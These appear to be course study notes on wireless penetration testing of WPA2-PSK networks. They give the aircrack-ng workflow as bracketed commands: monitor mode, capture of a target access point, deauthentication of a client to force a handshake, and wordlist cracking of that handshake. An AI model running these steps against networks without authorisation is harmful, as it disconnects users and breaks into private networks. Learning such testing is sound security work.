# Wireless Penetration Testing Overview
What is this?
- assessment of a wireless network
	- WPA2 PSK  >>>> we will ONLY focus on this for this course
	- WPA2 enterprise >> hard to set up, this can be a course on its own
- activities performed
	- evaluating strength of PSK
	- reviewing nearby networks
	- assessing guest networks
	- checking network access

Tools we use:
- wireless card (alfa) >> inject and listen to packets
	- get one with 5 and 2.4 compatibility 
- router (tp-link)
- laptop

❗️ Process:
1. Place - place wireless car into monitor mode
2. Discover - discover information about network: channel, BSSID
3. Select - select network and capture data
4. Perform - perform deauth attack
5. Capture - capture WPA handshake
6. Attempt - attempt to crack the handshake

# WPA PS2 Exploit Walkthrough
- make sure wireless card is connected, in Vmware:
	- removable devices > (device name) > connect
- check in terminal >> iwconfig // IP
- monitor mode: 
```bash
airmon-ng check kill
airmon-ng start wlan0 #check and use interface of wireless card
airodump-ng wlan0mon #detecing wireless devices, PWR -1 is close, Beacons = activity
airodump-ng -c 6 --bssid [mac of access point] -w capture wlan0mon # -c = channel/CH number, -w = file (capture)

#wait for handshake
```
- can speed up process with a deauth to capture handshake:
```bash
aireplay-ng -0 1 -a [BSSID] -c [STATION] wlan0mon  # -0 = dauth, 1 = times to run, -a (MAC), -c (STATION)
```
- don't deauth same client over and over, be patient and rotate until handshake captured
- after handshake obtained, analyze .cap file
```bash
ls capture*
aircrack-ng -w wordlist.txt -b [MAC] [capture file] #use aircrack with wordlist to crack
```
